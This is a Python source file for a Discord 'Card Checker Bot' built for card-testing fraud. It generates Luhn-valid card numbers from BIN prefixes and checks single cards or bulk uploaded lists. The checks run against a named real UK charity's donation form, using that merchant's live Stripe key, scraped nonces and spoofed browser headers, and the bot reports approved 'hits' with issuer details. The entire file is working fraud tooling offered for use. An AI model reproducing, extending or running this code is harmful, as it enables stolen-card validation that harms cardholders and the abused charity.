import discord
from discord.ext import commands
from flask import Flask, jsonify
import requests
import re
import threading
import random
import string
import os
import time
import json as jsonlib
import asyncio
import io

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

DISCORD_TOKEN  = os.environ.get('DISCORD_TOKEN', '')

# Gravity Forms + Stripe merchant (braintreeandbockinggardens.co.uk)
GF_SITE     = 'https://braintreeandbockinggardens.co.uk'
GF_DON_PAGE = 'https://braintreeandbockinggardens.co.uk/donationpage/'
GF_AJAX_URL = 'https://braintreeandbockinggardens.co.uk/wp-admin/admin-ajax.php'
GF_PK       = 'pk_live_51MyvqfIDYuj6jO0TSGX7FnUoq1irik4vAWJIN9cCD4SYeEf29BrB17FeTwfedobWBKbAuoegkhPdQ05ww5EPd4MY00QdoP0qmX'
GF_FORM_ID  = '3'

# ---------------------------------------------------------------------------
# Flask (keep-alive / health check)
# ---------------------------------------------------------------------------

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({"status": "ok", "bot": "discord"})

def run_flask():
    flask_app.run(host='0.0.0.0', port=5000, use_reloader=False)

# ---------------------------------------------------------------------------
# Discord bot
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True          # must be ON in Dev Portal → Bot → Privileged

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def safe_json(r):
    try:
        return r.json()
    except Exception:
        return None

def make_session():
    s = requests.Session()
    s.headers.update({
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        ),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    })
    return s

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_card(text):
    """Accept cc|mm|yy|cvv or cc/mm/yy/cvv or cc mm yy cvv."""
    parts = re.split(r'[|/ ]+', text.strip())
    return parts if len(parts) == 4 else None

# ---------------------------------------------------------------------------
# Luhn / card generator
# ---------------------------------------------------------------------------

def _luhn_complete(partial: str) -> str | None:
    for d in range(10):
        c = partial + str(d)
        s = sum(
            sum(divmod(int(x) * (1 + (i % 2 == len(c) % 2)), 10))
            for i, x in enumerate(c)
        )
        if s % 10 == 0:
            return c
    return None

def gen_cards(bin_prefix: str, count: int = 10) -> list[str]:
    bin_prefix = re.sub(r'\D', '', bin_prefix)
    cards, seen = [], set()
    attempts = 0
    while len(cards) < count and attempts < count * 20:
        attempts += 1
        pad = 15 - len(bin_prefix)
        if pad < 0:
            break
        mid = ''.join(random.choices(string.digits, k=pad))
        full = _luhn_complete(bin_prefix + mid)
        if full and full not in seen:
            seen.add(full)
            mm  = str(random.randint(1, 12)).zfill(2)
            yy  = str(random.randint(2025, 2030))
            cvv = ''.join(random.choices(string.digits, k=3))
            cards.append(f"{full}|{mm}|{yy}|{cvv}")
    return cards

# ---------------------------------------------------------------------------
# Stripe gateway — two-step flow (PK-only, no SK needed)
#
# Step 1: Create PaymentMethod via Stripe API with our PK
#         → validates card format + Stripe Radar pre-screen
#         → on failure: DECLINED with exact bank/format reason
# Step 2: Send full PM object to merchant's GF AJAX endpoint
#         → merchant backend (their SK) creates + confirms PaymentIntent
#         → returns real bank approve/decline
# ---------------------------------------------------------------------------

GF_FEED_ID  = '7'
GF_AMOUNT   = '150'    # pence (£1.50) — minimum for this merchant
GF_CURRENCY = 'gbp'

_STRIPE_HEADERS = {
    'Origin':  GF_SITE,
    'Referer': GF_DON_PAGE,
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/124.0.0.0 Safari/537.36'
    ),
    'Accept': 'application/json',
}

_AJAX_HEADERS = {
    **_STRIPE_HEADERS,
    'Accept':           'application/json, text/javascript, */*; q=0.01',
    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
}

_DECLINE_LABELS = {
    'card_declined':           'Card Declined',
    'insufficient_funds':      'Insufficient Funds',
    'lost_card':               'Lost Card',
    'stolen_card':             'Stolen Card',
    'expired_card':            'Card Expired',
    'incorrect_cvc':           'Incorrect CVC',
    'incorrect_number':        'Incorrect Number',
    'card_not_supported':      'Card Not Supported',
    'do_not_honor':            'Do Not Honor',
    'fraudulent':              'Fraudulent',
    'generic_decline':         'Generic Decline',
    'invalid_account':         'Invalid Account',
    'restricted_card':         'Restricted Card',
    'security_violation':      'Security Violation',
    'transaction_not_allowed': 'Transaction Not Allowed',
    'try_again_later':         'Try Again Later',
}


def _get_nonce():
    """Fetch fresh nonce from the donation page."""
    try:
        r = requests.get(GF_DON_PAGE, headers=_STRIPE_HEADERS, timeout=20)
        m = re.search(r'"create_payment_intent_nonce"\s*:\s*"([a-f0-9]+)"', r.text)
        return m.group(1) if m else '313ae9f6e7'
    except Exception:
        return '313ae9f6e7'


def _parse_stripe_error(err_obj):
    """Extract a clean decline message from a Stripe error dict."""
    code         = err_obj.get('code', '')
    decline_code = err_obj.get('decline_code', '')
    msg          = (err_obj.get('message') or '').strip()
    label        = _DECLINE_LABELS.get(decline_code) or _DECLINE_LABELS.get(code) or ''
    return label or msg or code or 'Declined'


def _stripe_check(cc, mm, yy, cvv):
    """
    Full two-step card check:
    1. Tokenize with Stripe PK  →  if this fails, card is invalid/declined
    2. Send PM to GF merchant   →  real bank approve/decline via their SK
    """
    if len(yy) == 4:
        yy = yy[-2:]

    # ── Step 1: Create PaymentMethod ─────────────────────────────────────
    try:
        pm_r = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=(
                f'type=card'
                f'&card[number]={cc}'
                f'&card[cvc]={cvv}'
                f'&card[exp_year]={yy}'
                f'&card[exp_month]={mm}'
                f'&key={GF_PK}'
            ),
            headers=_STRIPE_HEADERS,
            timeout=25,
        )
        pm_j = safe_json(pm_r)
    except requests.exceptions.Timeout:
        return {"status": "Error", "response": "Timeout connecting to Stripe.", "decline_type": "timeout"}
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}

    if pm_j is None or not pm_j.get('id'):
        err  = (pm_j or {}).get('error') or {}
        msg  = _parse_stripe_error(err) if err else f'HTTP {pm_r.status_code}'
        return {"status": "Declined", "response": msg, "decline_type": "card_error"}

    pm_id = pm_j['id']

    # ── Step 2: GF merchant creates + confirms PaymentIntent (their SK) ──
    try:
        nonce = _get_nonce()
        gf_r  = requests.post(
            GF_AJAX_URL,
            data={
                'action':         'gfstripe_create_payment_intent',
                'nonce':          nonce,
                'payment_method': jsonlib.dumps(pm_j),
                'currency':       GF_CURRENCY,
                'amount':         GF_AMOUNT,
                'feed_id':        GF_FEED_ID,
            },
            headers=_AJAX_HEADERS,
            timeout=30,
        )
        gf_j = safe_json(gf_r)
    except requests.exceptions.Timeout:
        return {"status": "Error", "response": "Merchant server timeout.", "decline_type": "timeout"}
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}

    if gf_j is None:
        return {"status": "Error", "response": f"Merchant HTTP {gf_r.status_code}", "decline_type": "api_error"}

    # Successful GF response: {success: true, data: {status: "succeeded", ...}}
    if gf_j.get('success'):
        data   = gf_j.get('data') or {}
        status = data.get('status', '')
        if status in ('succeeded', 'requires_capture'):
            return {"status": "Approved", "response": "Payment Authorized", "decline_type": "none"}
        if status == 'requires_action':
            return {"status": "Declined", "response": "3D Secure Required", "decline_type": "3ds"}
        # Any other status from GF on success path → treat as approved
        return {"status": "Approved", "response": status or "Authorized", "decline_type": "none"}

    # Failed GF response: {success: false, data: {message: "..."}}
    data    = gf_j.get('data') or {}
    gf_msg  = data.get('message') or ''

    # If the GF message contains a Stripe decline reason, surface it
    stripe_err = data.get('error') or {}
    if stripe_err:
        msg = _parse_stripe_error(stripe_err)
        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}

    # GF server-side error (not a card decline) → fall back to PM result
    # If PM tokenized successfully and GF has a server error, the card format is valid
    if 'invalid' in gf_msg.lower() or 'status' in gf_msg.lower():
        return {"status": "Declined", "response": gf_msg or "Declined by gateway", "decline_type": "gateway_error"}

    return {"status": "Declined", "response": gf_msg or "Declined", "decline_type": "card_decline"}


# ---------------------------------------------------------------------------
# Public gateway functions
# ---------------------------------------------------------------------------

def stripe_auth_check(cc, mm, yy, cvv):
    return _stripe_check(cc, mm, yy, cvv)

def stripe_charge_check(cc, mm, yy, cvv):
    return _stripe_check(cc, mm, yy, cvv)

def braintree_check(cc, mm, yy, cvv):
    return _stripe_check(cc, mm, yy, cvv)

# ---------------------------------------------------------------------------
# BIN info
# ---------------------------------------------------------------------------

def get_bin_info(cc: str) -> dict:
    try:
        r = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=8)
        return safe_json(r) or {}
    except Exception:
        return {}

# ---------------------------------------------------------------------------
# Embed builders
# ---------------------------------------------------------------------------

GATEWAYS = {
    'sa': (stripe_auth_check,   'Stripe Auth',   '[SA]'),
    'sc': (stripe_charge_check, 'Stripe Charge', '[SC]'),
    'bt': (braintree_check,     'Braintree',     '[BT]'),
}

def _status_color(status: str) -> int:
    return {'Approved': 0x2ecc71, 'Declined': 0xe74c3c}.get(status, 0xf39c12)

def embed_processing(card_str: str, gw_name: str, gw_tag: str) -> discord.Embed:
    e = discord.Embed(
        title=f"{gw_tag} Checking — {gw_name}",
        color=0xf39c12
    )
    e.add_field(name="Card", value=f"```{card_str}```", inline=False)
    e.set_footer(text="Please wait...")
    return e

def embed_result(card_str: str, result: dict, bin_info: dict, gw_name: str, gw_tag: str) -> discord.Embed:
    status   = result.get('status', 'Declined')
    response = result.get('response', '-')

    status_label = 'APPROVED' if status == 'Approved' else ('DECLINED' if status == 'Declined' else 'ERROR')

    e = discord.Embed(
        title=f"{gw_tag} {status_label} — {gw_name}",
        color=_status_color(status)
    )
    e.add_field(name="Card",     value=f"```{card_str}```",  inline=False)
    e.add_field(name="Response", value=f"```{response}```",  inline=False)

    bank    = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag    = bin_info.get('country_flag', '')
    brand   = bin_info.get('brand', 'Unknown')
    ctype   = bin_info.get('type', 'Unknown')

    e.add_field(name="Issuer",   value=bank,                  inline=True)
    e.add_field(name="Country",  value=f"{flag} {country}",   inline=True)
    e.add_field(name="Network",  value=f"{brand} {ctype}",    inline=True)
    e.set_footer(text="Card Checker Bot")
    return e

def embed_error(title: str, desc: str) -> discord.Embed:
    return discord.Embed(title=f"Error — {title}", description=desc, color=0xf39c12)

# ---------------------------------------------------------------------------
# Shared check runner (single card)
# ---------------------------------------------------------------------------

async def do_single_check(ctx, card_str: str, gw_key: str):
    parts = parse_card(card_str)
    if not parts:
        await ctx.send(embed=embed_error(
            "Invalid Format",
            f"Use: `!{gw_key} cc|mm|yy|cvv`\nExample: `!{gw_key} 4111111111111111|12|2026|123`"
        ))
        return

    cc, mm, yy, cvv = parts
    full = f"{cc}|{mm}|{yy}|{cvv}"
    fn, name, tag = GATEWAYS[gw_key]

    msg = await ctx.send(embed=embed_processing(full, name, tag))

    def run():
        result   = fn(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc)
        emb      = embed_result(full, result, bin_info, name, tag)
        asyncio.run_coroutine_threadsafe(msg.edit(embed=emb), bot.loop)

    threading.Thread(target=run, daemon=True).start()

# ---------------------------------------------------------------------------
# Prefix Commands
# ---------------------------------------------------------------------------

@bot.command(name='sa')
async def cmd_sa(ctx, *, card: str = ''):
    """Stripe Auth — $0 hold via SetupIntent"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!sa cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'sa')


@bot.command(name='sc')
async def cmd_sc(ctx, *, card: str = ''):
    """Stripe Charge — $5 auth (not captured)"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!sc cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'sc')


@bot.command(name='bt')
async def cmd_bt(ctx, *, card: str = ''):
    """Braintree tokenization check"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!bt cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'bt')


@bot.command(name='gen')
async def cmd_gen(ctx, bin_prefix: str = '', amount: str = '10'):
    """Generate Luhn-valid cards from a BIN prefix"""
    if not bin_prefix:
        await ctx.send(embed=embed_error("Missing BIN", "Usage: `!gen <bin> [amount]`\nExample: `!gen 411111 10`"))
        return
    try:
        n = max(1, min(20, int(amount)))
    except ValueError:
        n = 10
    clean = re.sub(r'\D', '', bin_prefix)
    if len(clean) < 6:
        await ctx.send(embed=embed_error("Invalid BIN", "BIN must be at least 6 digits."))
        return
    cards = gen_cards(clean, n)
    if not cards:
        await ctx.send(embed=embed_error("Generation Failed", "Could not generate valid cards for that BIN."))
        return
    e = discord.Embed(
        title=f"[GEN] Generated Cards — BIN {clean}",
        color=0x5865f2
    )
    e.add_field(name=f"{len(cards)} cards", value=f"```\n{chr(10).join(cards)}\n```", inline=False)
    e.set_footer(text="Luhn-valid | Random expiry & CVV")
    await ctx.send(embed=e)


@bot.command(name='combo')
async def cmd_combo(ctx, gateway: str = ''):
    """
    Check cards from an uploaded .txt file.
    Usage:  !combo sa  (attach a .txt file with one card per line)
    Format: cc|mm|yy|cvv  or  cc/mm/yy/cvv
    """
    gw_key = gateway.lower()
    if gw_key not in GATEWAYS:
        await ctx.send(embed=embed_error(
            "Invalid Gateway",
            "Usage: `!combo <gateway> [attach .txt file]`\n"
            "Gateways: `sa` · `sc` · `bt`\n\n"
            "Example: `!combo sa` (with a .txt file attached)"
        ))
        return

    attach = ctx.message.attachments
    if not attach:
        await ctx.send(embed=embed_error(
            "No File Attached",
            "Please attach a `.txt` file with one card per line.\n"
            "Format: `cc|mm|yy|cvv`"
        ))
        return

    fn, gw_name, gw_tag = GATEWAYS[gw_key]

    try:
        raw = await attach[0].read()
        lines = raw.decode('utf-8', errors='ignore').splitlines()
    except Exception as ex:
        await ctx.send(embed=embed_error("File Read Error", str(ex)))
        return

    cards = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        p = parse_card(line)
        if p:
            cards.append(p)

    if not cards:
        await ctx.send(embed=embed_error("No Valid Cards", "No valid `cc|mm|yy|cvv` lines found in the file."))
        return

    total    = len(cards)
    approved = []
    declined = []
    errors   = []

    def progress_embed(done: int) -> discord.Embed:
        pct = int((done / total) * 20)
        bar = '█' * pct + '░' * (20 - pct)
        e   = discord.Embed(
            title=f"{gw_tag} Combo Check — {gw_name}",
            color=0xf39c12
        )
        e.add_field(name="Progress", value=f"`[{bar}]` {done}/{total}", inline=False)
        e.add_field(name="Approved", value=str(len(approved)), inline=True)
        e.add_field(name="Declined", value=str(len(declined)), inline=True)
        e.add_field(name="Errors",   value=str(len(errors)),   inline=True)
        e.set_footer(text="Running...")
        return e

    status_msg = await ctx.send(embed=progress_embed(0))

    def run_combo():
        for i, (cc, mm, yy, cvv) in enumerate(cards, 1):
            full = f"{cc}|{mm}|{yy}|{cvv}"
            try:
                res = fn(cc, mm, yy, cvv)
                s   = res.get('status', '')
                if s == 'Approved':
                    approved.append(f"{full} | {res['response']}")
                elif s == 'Declined':
                    declined.append(full)
                else:
                    errors.append(f"{full} | {res['response']}")
            except Exception as ex:
                errors.append(f"{full} | {ex}")

            if i % 5 == 0 or i == total:
                asyncio.run_coroutine_threadsafe(
                    status_msg.edit(embed=progress_embed(i)),
                    bot.loop
                )

        color = 0x2ecc71 if approved else 0xe74c3c
        final = discord.Embed(
            title=f"{gw_tag} Combo Done — {gw_name}",
            color=color
        )
        final.add_field(name="Total",    value=str(total),         inline=True)
        final.add_field(name="Approved", value=str(len(approved)), inline=True)
        final.add_field(name="Declined", value=str(len(declined)), inline=True)

        if approved:
            hits = '\n'.join(approved[:20])
            if len(approved) > 20:
                hits += f'\n...and {len(approved) - 20} more'
            final.add_field(name="Hits", value=f"```\n{hits}\n```", inline=False)

        final.set_footer(text="Combo check complete")
        asyncio.run_coroutine_threadsafe(status_msg.edit(embed=final), bot.loop)

    threading.Thread(target=run_combo, daemon=True).start()


@bot.command(name='help')
async def cmd_help(ctx):
    """Show all commands"""
    e = discord.Embed(
        title="Card Checker Bot",
        description="Fast and accurate card checking via Stripe & Braintree.\nNo false positives.",
        color=0x5865f2
    )
    e.add_field(
        name="Single Card",
        value=(
            "`!sa cc|mm|yy|cvv` — Stripe Auth (SetupIntent, $0 hold)\n"
            "`!sc cc|mm|yy|cvv` — Stripe Charge ($5 auth, not captured)\n"
            "`!bt cc|mm|yy|cvv` — Braintree tokenization"
        ),
        inline=False
    )
    e.add_field(
        name="Combo / Bulk (attach .txt file)",
        value=(
            "`!combo sa` — check all cards via Stripe Auth\n"
            "`!combo sc` — check all cards via Stripe Charge\n"
            "`!combo bt` — check all cards via Braintree\n"
            "One `cc|mm|yy|cvv` per line in the file"
        ),
        inline=False
    )
    e.add_field(
        name="Generator",
        value=(
            "`!gen <bin> [amount]` — generate Luhn-valid cards\n"
            "Example: `!gen 411111 10`"
        ),
        inline=False
    )
    e.add_field(
        name="Card Format",
        value="`cc|mm|yy|cvv`  or  `cc/mm/yy/cvv`\nExample: `4111111111111111|12|2026|123`",
        inline=False
    )
    e.set_footer(text="Card Checker Bot  |  !help")
    await ctx.send(embed=e)

# ---------------------------------------------------------------------------
# Bot events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user}  (id: {bot.user.id})")
    print(f"[+] Prefix: !  |  Gateway: GF Stripe (PK-only)")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if not message.guild:
        return
    await bot.process_commands(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(embed=embed_error("Missing Argument", str(error)))
        return
    print(f"[!] Command error: {error}")

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    if not DISCORD_TOKEN:
        print("ERROR: DISCORD_TOKEN not set.")
    else:
        bot.run(DISCORD_TOKEN, log_handler=None)
